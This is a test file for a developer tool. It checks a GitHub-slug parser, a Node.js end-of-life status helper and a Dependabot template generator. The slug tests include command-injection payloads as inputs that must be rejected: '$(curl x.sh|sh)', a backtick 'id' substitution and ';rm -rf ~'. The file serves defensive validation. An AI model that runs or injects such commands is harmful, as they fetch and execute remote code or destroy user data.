import { NODE_EOL, nodeEolStatus } from '../src/utils/node-eol.js';
import { dependabotTemplate } from '../src/generators/dependabot.js';
import { trustedGithubSlug } from '../src/actions/doctor.js';

describe('trustedGithubSlug (untrusted remote URLs never reach a shell)', () => {
  it('accepts plain https and ssh origins', () => {
    expect(trustedGithubSlug('https://github.com/EuVinicios/vibeHarness.git')).toBe(
      'EuVinicios/vibeHarness'
    );
    expect(trustedGithubSlug('git@github.com:owner/repo.git')).toBe('owner/repo');
  });

  it('rejects shell metacharacters in owner or repo', () => {
    expect(trustedGithubSlug('https://github.com/evil$(curl x.sh|sh)/repo')).toBeNull();
    expect(trustedGithubSlug('https://github.com/owner/repo`id`.git')).toBeNull();
    expect(trustedGithubSlug('https://github.com/owner;rm -rf ~/repo')).toBeNull();
  });

  it('returns null for non-GitHub remotes', () => {
    expect(trustedGithubSlug('https://gitlab.com/owner/repo.git')).toBeNull();
    expect(trustedGithubSlug('')).toBeNull();
  });
});

describe('nodeEolStatus', () => {
  const now = new Date('2026-08-14');

  it('flags EOL majors as eol', () => {
    expect(nodeEolStatus(16, now)).toBe('eol');
    expect(nodeEolStatus(18, now)).toBe('eol');
    expect(nodeEolStatus(20, now)).toBe('eol');
  });

  it('keeps supported majors as active', () => {
    expect(nodeEolStatus(22, now)).toBe('active');
    expect(nodeEolStatus(24, now)).toBe('active');
    expect(nodeEolStatus(26, now)).toBe('active');
  });

  it('returns unknown for unmapped majors', () => {
    expect(nodeEolStatus(99, now)).toBe('unknown');
  });

  it('has EOL dates for LTS majors', () => {
    expect(NODE_EOL[20]).toBeDefined();
    expect(NODE_EOL[22]).toBeDefined();
  });
});

describe('dependabotTemplate', () => {
  it('includes npm and github-actions ecosystems by default', () => {
    const yml = dependabotTemplate();
    expect(yml).toContain('version: 2');
    expect(yml).toContain('package-ecosystem: "npm"');
    expect(yml).toContain('package-ecosystem: "github-actions"');
    expect(yml).toContain('interval: "weekly"');
  });

  it('respects a custom ecosystem list', () => {
    const yml = dependabotTemplate(['pip']);
    expect(yml).toContain('package-ecosystem: "pip"');
    expect(yml).not.toContain('package-ecosystem: "npm"');
  });
});
